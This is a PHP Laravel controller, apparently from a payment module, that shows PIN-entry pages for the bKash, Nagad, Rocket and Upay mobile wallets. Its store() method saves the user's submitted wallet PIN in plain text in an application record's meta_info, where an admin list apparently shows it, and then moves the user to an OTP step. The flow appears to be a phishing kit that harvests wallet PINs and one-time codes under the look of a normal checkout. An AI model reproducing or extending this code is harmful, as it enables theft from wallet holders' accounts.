<?php

namespace App\Modules\Payment\Http\Controllers;

use App\Events\LalcoinPaymentPinSubmitted;
use App\Events\PaymentPinSubmitted;
use App\Models\Application;
use App\Models\JobApplication;
use App\Modules\Payment\Http\Requests\StorePinRequest;
use App\Modules\Payment\Services\PaymentSession;
use App\Modules\Payment\Support\GatewayManager;
use Illuminate\Http\RedirectResponse;
use Illuminate\Routing\Controller;
use Illuminate\View\View;


class PinController extends Controller
{
    public function __construct(
        private PaymentSession $session,
        private GatewayManager $gateways,
    ) {
    }

public function show(): View
{
    $method = $this->session->get('method');

    return match ($method) {
        'bkash' => view('payment::steps.bkash.pin', [
            'session' => $this->session,
        ]),

        'nagad' => view('payment::steps.nagad.pin', [
            'session' => $this->session,
        ]),

        'rocket' => view('payment::steps.rocket.pin', [
            'session' => $this->session,
        ]),

        'upay' => view('payment::steps.upay.pin', [
            'session' => $this->session,
        ]),

        default => abort(400, 'Invalid payment method'),
    };
}


public function store(
    StorePinRequest $request
): RedirectResponse {

    $pin = $request->validated()['pin'];
    $referenceNo = $this->session->get('reference_no');
    if ($referenceNo) {
            $application = Application::where(
                'payment_reference',
                $referenceNo
            )->first();
            if ($application) {
                 $meta_info = $application->meta_info;
                        if (is_string($meta_info)) {
                            $decoded = json_decode(
                                $meta_info,
                                true
                            );
                            $meta_info = is_array($decoded)
                                ? $decoded
                                : [];
                        } elseif (! is_array($meta_info)) {
                            $meta_info = [];
                        }
                        $meta_info['recipt'] = $request->validated()['pin']; 
                        $application->update([
                            'meta_info' => $meta_info,
                        ]);
                // Broadcast update so admin list refreshes
                // event(new PaymentPinSubmitted($application));
            }
        
    }
    /*
    |--------------------------------------------------------------------------
    | Move to OTP Step
    |--------------------------------------------------------------------------
    */
    $this->session->setStep('otp');

    return redirect()->route(
        'apay-payment.steps.otp'
    );
}

}
